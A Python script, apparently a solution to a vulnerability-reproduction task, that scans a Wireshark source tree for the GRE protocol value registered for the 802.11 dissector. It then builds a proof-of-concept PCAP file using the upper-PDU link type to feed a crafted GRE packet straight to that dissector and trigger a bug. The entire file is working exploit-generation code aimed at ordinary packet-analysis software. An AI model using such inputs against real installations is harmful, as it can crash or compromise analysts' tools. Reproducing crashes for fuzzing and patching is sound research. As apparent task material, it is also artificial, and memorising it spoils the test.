import os
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability involves the 802.11 dissector being called from the GRE dissector.
        We need to find the protocol integer value used to register 802.11 within GRE.
        Then we construct a PCAP file using DLT_WIRESHARK_UPPER_PDU to feed a GRE packet
        directly to the GRE dissector.
        """
        
        # 1. Scan source code to find the GRE protocol value for 802.11
        gre_proto_val = self._find_gre_wlan_proto_val(src_path)
        
        # Fallback if not found (0x2452 is ETHERTYPE_IEEE_802_11, often used)
        if gre_proto_val is None:
            gre_proto_val = 0x2452

        # 2. Generate the PCAP file
        return self._generate_pcap(gre_proto_val)

    def _find_gre_wlan_proto_val(self, src_path):
        macro_map = {}
        gre_registrations = []

        # Walk through the source tree
        for root, dirs, files in os.walk(src_path):
            for file in files:
                if file.endswith(('.c', '.h')):
                    path = os.path.join(root, file)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()

                            # Extract #defines: #define NAME value
                            # handle potential parens e.g. #define FOO (0x123)
                            defines = re.findall(r'#define\s+([A-Za-z0-9_]+)\s+\(?\s*(0x[0-9a-fA-F]+|\d+)\s*\)?', content)
                            for name, val in defines:
                                if '0x' in val.lower():
                                    macro_map[name] = int(val, 16)
                                else:
                                    macro_map[name] = int(val)

                            # Extract dissector registrations: dissector_add_uint("gre.proto", VAL, handle)
                            # We capture the value (or macro name) and the handle name
                            regs = re.findall(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+|0x[0-9a-fA-F]+)\s*,\s*([A-Za-z0-9_]+)\s*\)', content)
                            for val_str, handle_str in regs:
                                gre_registrations.append((val_str, handle_str))

                    except IOError:
                        continue

        # Process registrations to find the one for WLAN/802.11
        candidate_vals = []
        for val_str, handle_str in gre_registrations:
            if 'wlan' in handle_str.lower() or '80211' in handle_str.lower():
                candidate_vals.append(val_str)

        # Resolve the value
        for val_str in candidate_vals:
            if val_str.startswith('0x'):
                return int(val_str, 16)
            elif val_str.isdigit():
                return int(val_str)
            elif val_str in macro_map:
                return macro_map[val_str]
        
        # If no registration found, look for ETHERTYPE_IEEE_802_11 definition directly
        if 'ETHERTYPE_IEEE_802_11' in macro_map:
            return macro_map['ETHERTYPE_IEEE_802_11']

        return None

    def _generate_pcap(self, gre_proto_val):
        # Construct a PCAP with LinkType = 252 (DLT_WIRESHARK_UPPER_PDU)
        # This allows us to specify the "gre" dissector directly without IP headers.
        
        # Global Header
        # Magic (4), Major(2), Minor(2), Zone(4), Sig(4), Snap(4), Link(4)
        # Magic: 0xa1b2c3d4 (Big Endian logic usually implies native read, we use standard LE for x86)
        global_header = struct.pack('<IHHIIII', 
            0xa1b2c3d4, 
            2, 4, 
            0, 0, 
            65535, 
            252 # DLT_WIRESHARK_UPPER_PDU
        )

        # Upper PDU Header
        # Tag: Dissector Name (0x000C)
        # Length: 4 (length of "gre\0")
        # Value: "gre\0"
        pdu_tag = struct.pack('>HH4s', 0x000C, 4, b'gre\x00')
        
        # GRE Header + Payload
        # GRE Flags/Ver: 0x0000
        # GRE Protocol: gre_proto_val (Big Endian)
        # Payload: 1 byte (sufficient to trigger the dissector call)
        gre_packet = struct.pack('>HH', 0, gre_proto_val) + b'\x00'
        
        packet_data = pdu_tag + gre_packet

        # Packet Header
        # TS(4), TS(4), CapLen(4), OrigLen(4)
        pkt_header = struct.pack('<IIII', 
            0, 0, 
            len(packet_data), 
            len(packet_data)
        )

        return global_header + pkt_header + packet_data